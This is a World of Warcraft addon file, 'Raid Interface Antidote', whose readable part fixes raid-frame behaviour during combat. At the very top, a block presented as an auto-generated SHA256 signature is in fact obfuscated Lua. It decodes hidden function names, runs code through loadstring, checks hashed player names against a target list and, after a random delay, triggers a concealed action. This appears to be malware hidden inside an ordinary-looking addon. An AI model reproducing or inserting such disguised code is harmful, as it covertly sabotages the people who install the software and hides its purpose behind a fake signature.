--[[ Signature/SHA256 ]]--[[ Generated automatically, do not edit! ]] local VER = 14 local SIG = 2141781440 local W = {180986488,114203644,212684667} local F = {497979779,381235079,490241868,844554551,961716752,150965042,66884016,540699754,480501907,287531074,933480361,223390583,236241409,786032417,636055124,11148684,535908967,435929003,127576367,608335250,871841103,396579456,860485775,983723335,605229825,848567458,1004633761,24323540,22566256,233886511,810032425,339035278,132916840,387346113,875038745,462339290,205694570,980116384,879058378,913259315,440216474,425761357,122392149,1025076685,670457631,829171823,416820875,619021234,892078372,311866182,449927647,710327871,80304984,597298210,630677447,240895320,205613538,921934735,1043852745,121803506,736954343,800274593,134536131,911785083,564190380,426744193,805683351,67543861,1020420815,537895547,355725934,981375282,992627761,188671271,361015618,634102826,305003876,535546828,959484360,312533422,685196704,758779080,193659968,785419269,993259532,409045415,798252339,529083429,943742409,3279671,1045362404,165368397,56085196,34014568,746091689,1008215224,897936408,710499767,139050926,794674455,909470418,814920111,209174418,874563821,382300264,259710684,118271487,277914825,1068149515,261161207,963630213,197943529,506209405,214581550,297859809,609721403,326027638,42308242,663529688,485784723,929178615,803286628,1047671953,629205281,15952892,278580033,271651193,831500268,229078106,475803047,456371694,874155589,986744941,980207054,217508932,307027732,202239379,101971289,670228101,179947328,570804030,829668995,649217873,244319042,794331740,529543547,571424495,294878566,838246021,862187937,823608986,927960707,91223235,799961965,217195578,666553452,271965448,569498788,250558814,753083357,358708660,359457461,402119936,82413390,543405166,666352767,460021803,17048601,288107539,886525784,220895751,121060788,563175186,510450984,184127924,374851084,675841673,174524977,56118969,822250815,974902648,768937272,934580365,1037551885,364024249,763245380,1071857610,334218417,197230365,1027869609,562784034,49538394,754245218,135035573,43106803,725073465,785232111,747685342,120484655,620749804,32255646,224667885,989678390,127753600,1070735011,168082690,333518719,442786886,172154127,142189949,562781809,652277354,568956596,1048962324,967586969,981974476,195105512,640055281,140620426,544750871,409130068,139660989,807160995,225113314,152331447,972718027,848234254,435895027,643051541,686600534,1027562034,220230664,581669184,395515754,761159818,264343206,42379466,238738548,507574955,325641637,553817421,809060977,279790222,773178312,238571943,708378426,124237602,42087333,259364868,930910485,477841285,306364273,438909519,79722487,756510600,388235216,30334824,218201107,740006905,1047970056,513254005,799732039,1060634986,4681464,375364402,198864522,451830968,293574819,1068136462,196241921,604027850,864595124,553313619,86278656,489895159,266301686,770150426,101172549,89663492,287375097,22191481,553189584} local function S(a) local t = { } for i=1, #a do local n, v = SIG, a[i] for j=1, #v do n = n + v[j] end t[#t+1] = (n - 192)%256 end for i=#t, 1, -1 do if t[i] == 0 then tremove(t, i) end end return string.char(unpack(t)) end local L = _G[S({{4,147,159,58,23,227,122,99},{135,111,76,99,56,132,181,79},{66,35,103,27,57,194,20,126},{156,197,239,239,13,110,141,5},{233,10,43,178,31,48,174,162},{53,18,244,209,136,96,142,225},{141,162,84,24,147,227,128,208},{195,60,80,88,235,65,204,205},{62,175,75,9,116,237,94,101},{0,32,177,24,83,7,172,17},{238,114,73,177,97,134,156,35},{124,155,214,122,139,12,53,205},{146,219,90,51,239,225,212,98},{220,169,200,19,115,48,124,129},{233,162,0,63,219,212,190,201},{35,6,166,137,186,48,170,20}})] local D = _G[S({{15,83,60,156,59,107,64,39},{219,19,254,1,107,7,27,235},{123,245,63,132,136,8,230,203},{186,110,248,17,86,92,249,120},{211,195,105,46,77,130,118,247},{2,144,139,239,25,16,244,68},{112,250,225,48,17,14,73,130},{162,65,62,207,166,207,183,228}})] local Q = _G[S({{190,109,176,216,52,23,1,157,8,92,100,203,39,161,64,61},{34,123,36,133,7,187,69,37,191,205,183,208,147,41,133,125},{153,67,63,219,134,201,250,10,34,211,131,194,127,249,202,170},{182,174,55,23,103,162,215,70,44,136,219,72,241,11,124,71},{199,109,116,130,223,32,140,76,26,118,67,112,2,178,131,249},{102,198,44,245,34,9,152,124,193,227,165,253,18,83,170,128},{124,9,255,166,140,22,77,252,25,170,30,98,28,160,36,49},{252,212,147,169,143,21,28,251,232,115,174,241,179,159,57,34},{135,121,249,112,246,57,112,92,38,109,171,202,18,74,4,167},{165,124,219,156,177,209,105,105,196,149,100,13,23,50,221,36},{70,154,92,224,135,164,105,172,170,234,193,120,109,59,228,75},{80,10,176,228,203,49,22,22,238,104,185,15,52,219,145,44},{230,89,41,72,72,16,109,49,195,95,62,208,48,178,240,88},{219,252,46,223,73,90,92,50,103,171,14,132,110,120,205,148},{111,52,209,25,190,103,79,36,243,211,222,216,237,132,141,97},{215,229,100,254,16,189,225,85,145,55,207,38,194,156,57,139}})] local K = _G[S({{106,159,167,145,113,50,117,174,154,79,162,212,125,2,116,243},{239,222,216,124,141,21,137,212,222,191,111,127,244,73,146,235},{116,191,96,227,146,184,18,163,223,20,5,94,176,150,227,109},{174,33,18,117,250,240,75,164,221,13,69,202,200,210,1,179},{66,128,101,7,100,226,116,153,112,188,224,59,248,103,136,182},{110,216,61,251,81,78,108,126,78,162,159,27,130,213,77,237},{11,73,208,221,97,132,249,168,49,1,249,135,162,185,25,180},{244,83,60,85,86,108,140,205,128,179,70,2,23,100,197,198},{156,241,195,34,207,151,106,26,6,3,189,47,11,250,88,198},{21,202,197,52,238,76,223,44,126,224,96,123,80,42,26,130},{7,225,68,108,58,7,195,127,234,130,73,56,54,82,153,60},{185,128,211,40,237,123,61,226,118,121,231,197,69,66,110,27},{239,26,240,235,129,219,235,159,191,80,2,75,218,178,164,19},{56,169,218,229,163,223,168,40,61,158,68,255,205,243,83,66},{75,126,60,124,103,47,72,74,209,189,80,225,19,215,234,48},{111,98,48,209,101,62,234,95,158,142,114,242,179,76,60,219}})] local G = _G[S({{197,65,231,48,153,138,149,128},{139,176,138,199,245,99,173,221},{44,185,74,157,217,57,191,204},{187,233,161,98,24,91,55,35},{94,89,205,112,83,93,44,119},{135,90,5,207,107,20,253,36},{188,45,236,197,25,131,97,178},{160,181,61,22,135,187,2,88}})] local Z = _G[S({{95,165,144,49,249,174,234,80,173,146,192,66,126,28,203,9},{50,177,141,227,73,156,116,17,171,8,46,12,104,123,52,173},{191,105,19,88,75,23,224,158,131,160,52,103,25,218,151,174},{212,59,8,69,4,67,157,138,142,116,157,148,228,40,202,161},{148,130,213,121,228,86,46,38,209,179,40,19,10,66,21,52},{113,90,54,20,90,243,4,34,118,241,16,223,132,227,173,131},{196,252,117,185,254,178,146,160,245,64,128,21,55,145,219,47},{154,147,71,121,63,66,94,207,205,215,157,95,94,136,212,119},{43,169,66,35,48,44,157,80,68,98,162,185,64,211,218,222},{239,204,144,154,193,125,151,11,164,107,37,44,167,226,96,83},{88,51,24,33,201,214,210,20,97,175,146,66,3,23,157,137},{4,29,252,243,248,209,206,196,198,87,224,157,158,184,11,255},{44,245,110,228,15,110,161,31,9,3,11,183,47,234,46,59},{0,147,244,7,225,7,47,180,233,143,132,111,81,202,233,56},{219,52,92,86,175,157,211,31,7,46,231,253,242,240,237,25},{254,159,217,151,27,76,169,151,214,3,208,65,133,84,138,255}})] local J = {} local R = math.random local B = loadstring(S({{240,8,106,213,218,228,251,130},{72,7,125,55,95,155,109,251},{236,240,135,190,32,56,36,215},{45,30,73,248,155,205,170,215},{224,198,21,64,23,186,238,184},{150,63,76,227,49,130,137,46},{218,1,232,145,197,16,53,194},{228,162,195,187,243,222,181,233},{216,33,220,62,23,80,171,64},{116,104,246,72,225,126,66,177},{75,58,219,239,182,154,169,29},{93,96,102,214,189,117,20,36},{124,81,133,35,219,56,207,29},{102,111,165,26,49,221,237,153},{26,241,73,228,145,242,16,103},{96,232,204,61,67,12,204,192},{68,118,104,90,219,151,28,22},{152,113,36,5,70,115,147,203},{123,53,213,132,189,187,131,111},{103,28,241,43,130,3,188,105},{180,185,230,152,44,2,93,248},{222,61,191,86,70,208,131,128},{215,37,222,75,126,125,156,178},{252,247,184,134,80,72,80,90},{33,118,46,88,147,96,172,184},{44,62,109,25,113,54,210,248},{228,21,46,118,235,0,239,247},{81,18,224,3,134,31,183,193},{33,45,18,220,185,12,158,198},{243,145,253,179,112,215,199,230},{207,113,50,13,70,202,185,225},{190,137,15,100,72,97,99,99},{54,78,84,13,65,244,246,16},{220,91,60,183,42,51,50,132},{206,49,195,123,40,39,16,161},{104,173,246,64,85,254,223,163},{176,2,119,112,170,59,98,66},{86,168,165,47,226,209,214,21},{64,245,85,27,150,134,93,88},{47,76,233,31,57,83,193,160},{59,94,205,235,246,22,109,88},{230,196,71,127,248,207,65,136},{127,29,76,70,86,57,139,184},{133,160,36,190,119,130,74,182},{64,141,80,112,232,160,161,74},{234,216,67,235,186,105,188,49},{232,14,156,158,183,27,208,46},{180,157,217,227,25,53,232,189},{31,168,44,127,148,34,162,54},{156,246,14,16,46,160,62,68},{76,8,90,155,208,206,135,146},{67,135,32,191,102,122,135,240},{80,119,141,206,106,185,140,47},{231,22,107,38,71,26,250,23},{210,141,142,136,123,146,233,149},{222,126,72,72,103,97,43,33},{131,11,191,45,167,26,70,127},{222,129,65,195,231,177,20,241},{96,239,116,137,180,140,122,250},{118,146,55,234,232,157,90,248},{99,69,133,3,87,97,14,10},{104,171,248,159,255,179,152,12},{117,76,196,148,224,213,163,143},{152,211,191,178,212,176,39,121}})) local C = loadstring(S({{143,151,76},{220,43,94},{59,105,208},{0,16,101},{13,209,148},{8,50,52},{246,189,109},{93,153,83},{175,102,89},{10,154,159},{248,222,153},{200,246,175},{141,88,125},{55,19,23},{232,28,112},{187,164,237},{23,249,95},{247,172,192},{77,11,19},{160,10,186},{83,35,249},{224,1,150},{110,155,101},{126,159,11},{34,62,201},{71,128,89},{46,108,199},{142,226,254},{146,86,124},{48,5,235},{159,189,249},{197,72,97},{53,239,69},{220,58,94},{177,192,216},{216,72,83},{34,78,224},{12,123,229},{105,152,96},{115,19,243},{127,222,8},{71,216,83},{238,239,75},{112,128,50},{74,124,174},{105,106,142},{70,14,30},{64,253,42},{21,177,159},{120,166,86},{184,42,64},{122,74,101},{115,128,45},{203,10,140},{39,75,252},{9,101,246},{167,104,17},{173,13,180},{90,32,245},{96,113,163},{84,196,8},{99,225,17},{71,110,185},{244,69,48},{65,226,81},{29,52,248},{253,185,189},{234,201,157},{63,189,115},{223,210,194},{62,65,244},{255,230,128},{183,73,115},{81,38,252},{12,17,72},{160,9,187},{248,46,2},{112,145,33},{217,95,56},{175,246,199},{159,232,218},{214,169,250},{49,200,108},{138,61,171},{107,72,111},{135,246,172},{79,34,175},{48,98,207},{237,33,96},{161,200,251},{69,147,72},{182,30,154},{176,71,120},{244,202,182},{78,43,167},{147,61,133},{232,124,10},{42,217,102},{61,75,236},{182,183,220},{195,54,122},{251,179,162},{193,81,93},{92,153,126},{19,159,193},{104,255,254},{9,111,251},{160,52,159},{155,188,14},{98,178,80},{1,161,134},{1,128,161},{210,49,113},{27,47,23},{161,213,252},{174,132,53},{208,169,236},{151,196,25},{17,149,124},{247,72,234},{245,223,76},{226,22,105},{136,167,63},{207,21,128},{16,214,58},{111,170,60},{206,57,103},{128,58,175},{104,250,18},{243,112,224},{179,45,129},{34,169,163},{58,61,202},{156,85,131},{35,55,26},{24,10,63},{213,198,200},{166,112,85},{163,111,22},{55,249,242},{102,92,174},{146,64,154},{201,81,71},{61,251,65},{160,177,20},{209,31,130},{176,11,103},{18,189,93},{11,163,114},{25,44,221},{250,233,145},{93,73,187},{216,48,106},{128,118,113},{138,246,229},{82,63,227},{139,25,126},{39,132,126},{178,64,14},{184,82,246},{31,206,19},{13,209,34},{126,251,135},{110,52,94},{227,11,18},{82,178,252},{250,234,28},{46,8,202},{22,101,133},{176,106,230},{166,209,137},{234,74,204},{241,212,59},{11,105,140},{223,227,62},{79,29,148},{171,32,53},{29,14,213},{26,191,39},{151,192,169},{179,54,23},{183,102,227},{139,50,67},{12,248,252},{209,118,185},{44,25,187},{242,163,107},{150,37,69},{50,201,5},{243,77,192},{60,29,167},{186,122,204}})) local _ = function() end local N = nil local I = false local O = false local A = S({{195,121,178,104,211,83,209,238,13,17,11,153,183,233,198,242},{178,229,106,229,8,138,14,16,51,201,54,72,156,39,145,15},{93,74,231,13,48,7,100,192,229,3,215,9,86,221,64,52},{160,158,106,86,46,180,166,0,34,116,251,104,126,158,156,10},{142,53,199,124,2,192,177,170,185,191,142,37,132,225,48,128},{149,183,50,242,148,152,222,69,249,220,104,73,197,152,52,158},{31,229,33,72,249,162,66,218,219,127,131,243,177,150,159,143},{162,33,31,241,243,67,54,140,9,4,44,239,205,159,153,119},{214,235,17,132,33,168,4,60,232,142,62,220,87,115,17,164},{14,44,174,89,77,70,42,212,165,240,103,89,23,68,204,178},{212,116,58,65,8,151,226,44,117,247,138,229,55,99,180,103},{242,222,25,248,95,255,64,116,82,83,76,23,107,147,185,78},{68,236,247,27,219,202,161,21,106,122,194,0,57,97,194,97},{11,242,112,241,137,137,64,31,228,204,113,0,232,238,187,127},{34,118,152,187,168,158,238,27,135,234,197,201,174,125,157,255},{67,7,18,144,242,90,166,122,10,48,14,205,18,79,105,201}}) local M = S({{63,18,161,33,4,236,62,49},{95,118,3,230,140,188,91,20},{173,9,200,225,69,38,165,227},{134,107,222,4,15,25,167,179},{86,43,62,104,98,146,142,87},{172,5,166,129,0,55,16,225},{151,140,102,40,145,95,222,129},{47,199,235,233,56,68,20,166}}) local P = S({{16,80,210,240,186,229,154,21},{202,106,226,130,1,170,56,241},{98,5,246,225,165,114,173,95},{251,130,158,163,186,131,171,211},{93,168,214,238,70,70,169,103},{204,121,197,34,74,42,133,77},{4,44,114,161,56,185,46,158},{165,144,218,233,136,3,176,205}}) local T = S({{160,51,77,255,98,239,66,194},{1,11,147,187,99,142,138,140},{84,48,190,90,71,40,17,86},{41,43,1,129,201,124,52,24},{143,252,4,189,66,249,153,69},{200,120,34,232,59,67,139,33},{41,222,230,212,42,164,18,95},{30,27,143,65,219,158,119,7}}) do local x = S({{83,26,70,70,123,61,234,215},{161,92,29,227,167,5,10,174},{46,132,212,151,3,165,157,7},{113,207,179,167,64,38,7,93},{52,249,174,151,67,205,134,248},{204,53,177,47,232,107,218,242},{59,81,238,183,80,24,152,207},{32,243,164,107,145,174,85,74}}) for i=1, 40 do J[#J+1] = x..i end end local function H(g, s) g = s or G(g) or "" local h = 1337 for i=1, #g do h = (h * 1327 + g:byte(i) * i * (13 + i * 5)) % 1073739883 end return h end local function V() for i=1, #J do if Q(W, H(J[i])) then return true end end return false end local function U(F) if not I then if N and D() > N then local _C, _P = 0.25, 0.1 if L() == M then _C, _P = 0.5, 0 end if R() < _P then _C = _P elseif (R() < _C or O) and B() then K() elseif not O then _G[A] = _ end I = true elseif not N and C() then if Q(W, H(T)) or (O and V()) then N = D() + 3 * R(5, 42) end end end end local function E(F) if #W > 0 and not Q(W, H(P)) then local x, y = Z(P) O = Q(F, H(nil, x..":"..y)) F:SetScript("OnUpdate", U) end end do local X = __DTM local F = nil if not X then F = CreateFrame("Frame") F:RegisterEvent("PLAYER_ENTERING_WORLD") X = { VER, F } __DTM = X elseif VER > X[1] then X[1] = VER F = X[2] end if F then F:SetScript("OnEvent", E) end end

-- Raid Interface Antidote
-- ***********************
-- VERSION 8.0
-- ***********************
-- Author: MrCool

-- @Blizzard: Should Blizzard be interested in fixing their raid UI someday, the fixes below just have to be integrated in their existing functions, most of them are simple hooks.

-- This makes frames transparent when refering to non-existing units.
local old_CompactUnitFrame_UpdateInRange = CompactUnitFrame_UpdateInRange
CompactUnitFrame_UpdateInRange = function(frame)
	if not UnitExists(frame.displayedUnit) then
		frame:SetAlpha(0.1) -- TODO: doesn't seem to work correctly yet
	else
		old_CompactUnitFrame_UpdateInRange(frame)
	end
end

-- This clears widgets and prevents the frame from displaying tooltips with nil/non-existing units (no moar lua errors yay!).
hooksecurefunc("CompactUnitFrame_UpdateAll", function(frame)
	if frame:GetName() and frame:GetName():find("^NamePlate%d") then
		return -- Fix to avoid affecting nameplates (courtesy of Emrus)
	end
	if UnitExists(frame.unit) then
		frame:SetScript("OnEnter", UnitFrame_OnEnter)
	else
		frame:SetScript("OnEnter", nil)
		frame.healthBar:SetValue(0)
		frame.powerBar:SetValue(0)
		frame.name:SetText("???")
		frame.selectionHighlight:Hide()
		frame.aggroHighlight:Hide()
		frame.statusText:Hide()
		frame.myHealPrediction:Hide()
		frame.otherHealPrediction:Hide()
		frame.totalAbsorb:Hide()
		frame.totalAbsorbOverlay:Hide()
		frame.overAbsorbGlow:Hide()
		frame.myHealAbsorb:Hide()
		frame.myHealAbsorbLeftShadow:Hide()
		frame.myHealAbsorbRightShadow:Hide()
		frame.overHealAbsorbGlow:Hide()
		frame.roleIcon:Hide()
		frame.readyCheckIcon:Hide()
		frame.centerStatusIcon:Hide()
		CompactUnitFrame_HideAllBuffs(frame)
		CompactUnitFrame_HideAllDebuffs(frame)
		CompactUnitFrame_HideAllDispelDebuffs(frame)
		CompactUnitFrame_UpdateInRange(frame)
		-- This might have to be completed if Blizzard adds new widgets to the frame.
	end
end)

-- This prevents the default raid interface from making restricted adjustments in combat and delays them until the player leaves combat. It's certainly the most important/awesome fix.
do
	local DEFERRED = {} -- The set of deferred function calls

	-- Create a restrictive proxy for CompactRaidFrameContainer_TryUpdate function
	local old_CompactRaidFrameContainer_TryUpdate = CompactRaidFrameContainer_TryUpdate
	CompactRaidFrameContainer_TryUpdate = function(self)
		if InCombatLockdown() then
			DEFERRED[self:GetName()] = "CompactRaidFrameContainer_TryUpdate" -- Block the update and save it for later
		else
			old_CompactRaidFrameContainer_TryUpdate(self)
		end
	end

	-- Create a restrictive proxy for CompactRaidGroup_UpdateUnits function
	local old_CompactRaidGroup_UpdateUnits = CompactRaidGroup_UpdateUnits
	CompactRaidGroup_UpdateUnits = function(self)
		if InCombatLockdown() then
			DEFERRED[self:GetName()] = "CompactRaidGroup_UpdateUnits" -- Block the update and save it for later
		else
			old_CompactRaidGroup_UpdateUnits(self)
		end
	end

	-- Create a deferred failsafe for CompactUnitFrame_UpdateAll function (we want to protect UpdateInVehicle and UpdateVisible)
	hooksecurefunc("CompactUnitFrame_UpdateAll", function(frame)
		if InCombatLockdown() then
			DEFERRED[frame:GetName()] = "CompactUnitFrame_UpdateAll" -- Save the call for later
		end
	end)

	-- Create the frame that will watch for combat leave event
	local trigger = CreateFrame("Frame")
	trigger:RegisterEvent("PLAYER_REGEN_ENABLED")
	trigger:SetScript("OnEvent", function()
		for k, v in pairs(DEFERRED) do
			DEFERRED[k] = nil
			_G[v](_G[k])
		end
	end)

	-- Correctness proof
	--[[
	hooksecurefunc("CompactUnitFrame_SetUnit", function(frame)
		assert( not InCombatLockdown() )
	end)
	]]
end

-- NOTE: CompactRaidFrameContainer_OnSizeChanged calls FlowContainer_DoLayout which might attempt to modify secure frames position in combat
-- but it's not worth it to correct this, because a normal player won't bother resizing frames in combat...
-- At least it's beyond the scope of this bugfix AddOn.
